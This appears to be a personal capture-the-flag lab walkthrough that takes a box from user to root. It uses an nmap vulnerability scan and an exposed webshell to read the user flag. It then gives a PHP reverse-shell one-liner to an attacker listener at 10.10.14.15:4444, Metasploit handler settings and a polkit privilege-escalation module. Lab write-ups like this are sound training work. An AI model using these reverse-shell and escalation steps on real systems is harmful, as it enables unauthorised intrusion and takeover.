## User Own

```shell
sudo nmap --script vuln *ip*            vulnerability scan
```

The vulnerability scan above shows that port 80 and port 22 is open
Port 80 open means I can google the IP address and see what shows up

![[Pasted image 20240304111614.png]]

Quick google search shows that a webshell is available from the ip address
I can use this to find the users flag. As this has low level privileges
Using a webshell you can't 'cd' into any directories but you can 'ls' and show any files
Using this process I did the following:
```shell
ls /home
```
![[Pasted image 20240304112000.png]]
```shell
ls /home/pwnmeow
```
![[Pasted image 20240304112105.png]]
Bingo. Found the flag. Now i need to cat the file to open it
```shell
cat /home/pwnmeow/user.txt
```
![[Pasted image 20240304112245.png]]

## System Own

I need to set up a reverse shell and then escalate the privileges of that shell. The same as in PwnKit
First thing I do is set up a listener in my terminal on port 4444
```shell
ncat -lvnp 4444
```

Next I need to set up the webshell to send a shell to the listener

```shell
php -r '$sock=fsockopen("10.10.14.15",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

After I execute this code the listener then connects to the shell
![[Pasted image 20240304113307.png]]
But as you can see I don't have admin privileges yet
So i must use a Metasploit to give myself admin
This won't work without using metasploit to start the reverse shell as I can't background the session to keep running while I use other exploits

## To start the reverse shell in Metasploit

1. Open Metasploit
2. Configure `multi/handler` to listen for connections: `use exploit/multi/handler`
3. Set the payload - a generic tcp listener will do - `set payload generic/shell_reverse_tcp`
4. Configure payload options - should match details used in php reverse shell code:
	1. `set LHOST 10.10.14.15`
	2. `set LPORT 4444`
5. Start the exploit: `Run`
6. Execute the php reverse shell code in the webshell
```shell
php -r '$sock=fsockopen("10.10.14.15",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Background the session so another exploit can be run to escalate the privileges
![[Pasted image 20240304114824.png]]

After this I searched for polkit for linux privilege escalation
And `use 2` like in PwnKit
![[Pasted image 20240304115137.png]]

Set the options:
	1. `set LHOST 10.10.14.15`
	2. `set session 1` - `sessions` can be used to find a list of currently active sessions

And `run`
![[Pasted image 20240304115304.png]]
'Session 2 opened' this means its a success and I can search and open the new session
![[Pasted image 20240304115352.png]]
As you can see session 2 is a root session
![[Pasted image 20240304115719.png]]
Using cd, ls and cat I find and open the flag and finish the box!